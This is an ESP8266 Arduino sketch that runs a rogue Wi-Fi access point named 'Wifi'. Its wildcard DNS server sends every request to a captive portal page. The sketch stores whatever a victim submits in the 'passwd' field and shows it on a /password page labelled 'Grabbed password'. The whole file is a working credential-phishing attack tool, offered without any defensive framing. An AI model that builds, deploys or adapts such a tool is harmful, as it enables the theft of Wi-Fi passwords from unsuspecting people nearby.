#include "text.h"
#include <ESP8266WiFi.h>
#include <DNSServer.h> 
#include <ESP8266WebServer.h>

#define SSID_NAME "Wifi"

String password;

const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(8,8,8,8); // Gateway

DNSServer dnsServer; 
ESP8266WebServer webServer(80);

void main_page() {
  webServer.send(200, "text/html", main_html);
}

void send_page() {
  password = webServer.arg("passwd");
  webServer.send(200, "text/html", send_html);
}

void password_page() {
  String html = "<!DOCTYPE html>";
  html += "<html>";
  html += "<head>";
  html += "<meta charset=\"utf-8\">";
  html += "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">";
  html += "<title>Password</title>";
  html += "</head>";
  html += "<body>";
  html += "<h1>Grabbed password: " + password + "</h1>";
  html += "</body>";
  html += "</html>";
  webServer.send(200, "text/html", html);
}

void setup() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
 
  dnsServer.start(DNS_PORT, "*", APIP);
  webServer.on("/", main_page);
  webServer.on("/send", HTTP_GET, send_page);
  webServer.on("/password", password_page);

  webServer.onNotFound(main_page);
  webServer.begin();
}


void loop() { 
  dnsServer.processNextRequest();
  webServer.handleClient();
}